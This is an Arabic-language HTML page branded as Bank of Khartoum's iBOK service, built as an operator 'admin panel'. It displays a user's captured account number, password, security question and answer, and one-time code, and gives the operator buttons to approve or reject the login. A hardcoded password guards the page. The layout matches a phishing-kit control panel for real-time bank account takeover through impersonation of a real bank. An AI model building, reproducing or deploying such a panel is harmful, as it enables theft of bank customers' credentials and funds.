<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>iBOK - لوحة الإدارة</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 30px 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .admin-container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            overflow: hidden;
        }
        .admin-header {
            background: linear-gradient(135deg, #c1121f, #e63946);
            padding: 24px 20px;
            color: white;
            text-align: center;
        }
        .admin-header h1 {
            font-size: 28px;
            font-weight: 800;
        }
        .admin-header h1 i {
            margin-left: 8px;
        }
        .admin-body {
            padding: 24px;
        }
        .admin-body .welcome {
            font-size: 18px;
            font-weight: 700;
            color: #c1121f;
            margin-bottom: 20px;
            text-align: center;
            border-bottom: 2px solid #e63946;
            padding-bottom: 12px;
        }
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 24px;
        }
        .data-table th,
        .data-table td {
            padding: 12px 10px;
            border-bottom: 1px solid #eee;
            text-align: right;
        }
        .data-table th {
            background: #f8f9fa;
            color: #c1121f;
            font-weight: 700;
            width: 40%;
        }
        .data-table td {
            font-weight: 500;
            color: #333;
        }
        .admin-actions {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 12px;
        }
        .admin-actions button {
            padding: 12px 28px;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            font-family: 'Cairo', sans-serif;
            transition: 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .btn-accept {
            background: #28a745;
            color: white;
        }
        .btn-accept:hover {
            background: #1e7e34;
        }
        .btn-reject {
            background: #e63946;
            color: white;
        }
        .btn-reject:hover {
            background: #c1121f;
        }
        .btn-back {
            background: #f0f0f0;
            color: #555;
        }
        .btn-back:hover {
            background: #e0e0e0;
        }
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #888;
        }
        .empty-state i {
            font-size: 48px;
            color: #ddd;
            margin-bottom: 16px;
        }
        .footer-note {
            text-align: center;
            font-size: 13px;
            color: #aaa;
            margin-top: 20px;
            border-top: 1px solid #eee;
            padding-top: 16px;
        }
        @media (max-width: 480px) {
            .admin-header h1 { font-size: 24px; }
            .data-table th, .data-table td { font-size: 14px; padding: 10px 6px; }
            .admin-actions button { font-size: 14px; padding: 10px 20px; }
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <div class="admin-header">
            <h1><i class="fas fa-user-cog"></i> لوحة الإدارة</h1>
        </div>
        <div class="admin-body">
            <div class="welcome"><i class="fas fa-clipboard-list"></i> طلب تسجيل دخول جديد</div>

            <!-- عرض البيانات -->
            <div id="dataContainer">
                <table class="data-table">
                    <tr><th>رقم الحساب</th><td id="adminAccount">-</td></tr>
                    <tr><th>كلمة المرور</th><td id="adminPassword">-</td></tr>
                    <tr><th>سؤال الأمان</th><td id="adminQuestion">-</td></tr>
                    <tr><th>إجابة الأمان</th><td id="adminAnswer">-</td></tr>
                    <tr><th>رمز OTP المدخل</th><td id="adminOtp">-</td></tr>
                </table>
            </div>

            <!-- أزرار القبول والرفض -->
            <div class="admin-actions">
                <button class="btn-accept" onclick="acceptRequest()"><i class="fas fa-check"></i> قبول</button>
                <button class="btn-reject" onclick="rejectRequest()"><i class="fas fa-times"></i> رفض</button>
                <button class="btn-back" onclick="goBack()"><i class="fas fa-arrow-right"></i> العودة</button>
            </div>
            <div class="footer-note">© 2025 iBOK | بنك الخرطوم</div>
        </div>
    </div>

    <script>
        // ============================================================
        // 🔐 حماية صفحة الإدارة بكلمة مرور
        // ============================================================
        (function adminAuth() {
            const ADMIN_PASSWORD = 'snox_admin_2025';
            const sessionValid = sessionStorage.getItem('admin_authenticated');

            if (!sessionValid || sessionValid !== 'true') {
                const userPass = prompt('🔐 أدخل كلمة مرور المدير للوصول إلى لوحة الإدارة:');
                if (userPass === null) {
                    window.location.href = 'index.html';
                    return;
                }
                if (userPass !== ADMIN_PASSWORD) {
                    alert('❌ كلمة مرور غير صحيحة!');
                    window.location.href = 'index.html';
                    return;
                }
                sessionStorage.setItem('admin_authenticated', 'true');
            }
        })();

        // ============================================================
        // 📊 تحميل البيانات وعرضها
        // ============================================================
        function loadAdminData() {
            const account = localStorage.getItem('admin_account') || '-';
            const password = localStorage.getItem('admin_password') || '-';
            const question = localStorage.getItem('admin_question') || '-';
            const answer = localStorage.getItem('admin_answer') || '-';
            const otp = localStorage.getItem('admin_otp') || '-';

            document.getElementById('adminAccount').textContent = account;
            document.getElementById('adminPassword').textContent = password;
            document.getElementById('adminQuestion').textContent = question;
            document.getElementById('adminAnswer').textContent = answer;
            document.getElementById('adminOtp').textContent = otp;
        }

        // ============================================================
        // ✅ قبول الطلب → تحويل المستخدم إلى لوحة التحكم الرئيسية
        // ============================================================
        function acceptRequest() {
            // التحقق من وجود بيانات
            const hasData = localStorage.getItem('admin_account');
            if (!hasData) {
                alert('⚠️ لا توجد بيانات للموافقة عليها!');
                return;
            }

            // تخزين حالة القبول في sessionStorage (للمستخدم)
            sessionStorage.setItem('user_approved', 'true');

            // عرض رسالة تأكيد
            const confirmMsg = confirm('✅ هل أنت متأكد من قبول طلب تسجيل الدخول هذا؟\nسيتم تحويل المستخدم إلى لوحة التحكم.');
            if (!confirmMsg) return;

            // إعلام المستخدم بالقبول ثم تحويله إلى لوحة التحكم
            alert('✅ تم قبول الطلب بنجاح. جاري تحويل المستخدم إلى لوحة التحكم...');

            // مسح بيانات الإدارة (لأن الطلب انتهى)
            // لكن نحتفظ ببيانات المستخدم لاستخدامها في لوحة التحكم
            // يمكن نقلها إلى sessionStorage بدلاً من localStorage
            const userData = {
                account: localStorage.getItem('admin_account'),
                password: localStorage.getItem('admin_password'),
                question: localStorage.getItem('admin_question'),
                answer: localStorage.getItem('admin_answer'),
                otp: localStorage.getItem('admin_otp')
            };

            // تخزين في sessionStorage للاستخدام في لوحة التحكم
            sessionStorage.setItem('approved_user_account', userData.account);
            sessionStorage.setItem('approved_user_password', userData.password);
            sessionStorage.setItem('approved_user_question', userData.question);
            sessionStorage.setItem('approved_user_answer', userData.answer);
            sessionStorage.setItem('approved_user_otp', userData.otp);

            // مسح localStorage المؤقت
            localStorage.clear();

            // التوجيه إلى لوحة التحكم الرئيسية (dashboard)
            window.location.href = 'dashboard.html';
        }

        // ============================================================
        // ❌ رفض الطلب → العودة إلى تسجيل الدخول مع رسالة
        // ============================================================
        function rejectRequest() {
            const hasData = localStorage.getItem('admin_account');
            if (!hasData) {
                alert('⚠️ لا توجد بيانات لرفضها!');
                return;
            }

            const confirmMsg = confirm('❌ هل أنت متأكد من رفض طلب تسجيل الدخول هذا؟');
            if (!confirmMsg) return;

            alert('❌ تم رفض الطلب. سيتم إعادة توجيه المستخدم إلى صفحة تسجيل الدخول.');

            // مسح جميع البيانات
            localStorage.clear();
            sessionStorage.removeItem('admin_authenticated');

            // التوجيه إلى صفحة تسجيل الدخول مع رسالة رفض (عن طريق الـ URL)
            window.location.href = 'index.html?status=rejected';
        }

        // ============================================================
        // ↩️ العودة إلى الصفحة الرئيسية (دون مسح البيانات)
        // ============================================================
        function goBack() {
            window.location.href = 'index.html';
        }

        // ============================================================
        // 🚀 تحميل الصفحة
        // ============================================================
        window.onload = function() {
            const hasData = localStorage.getItem('admin_account');
            if (!hasData) {
                document.getElementById('dataContainer').innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-exclamation-circle"></i>
                        <p>لا توجد طلبات معلقة لعرضها.</p>
                    </div>
                `;
                // تعطيل الأزرار إذا لم توجد بيانات
                document.querySelector('.btn-accept').style.display = 'none';
                document.querySelector('.btn-reject').style.display = 'none';
            } else {
                loadAdminData();
            }
        };
    </script>
</body>
</html>
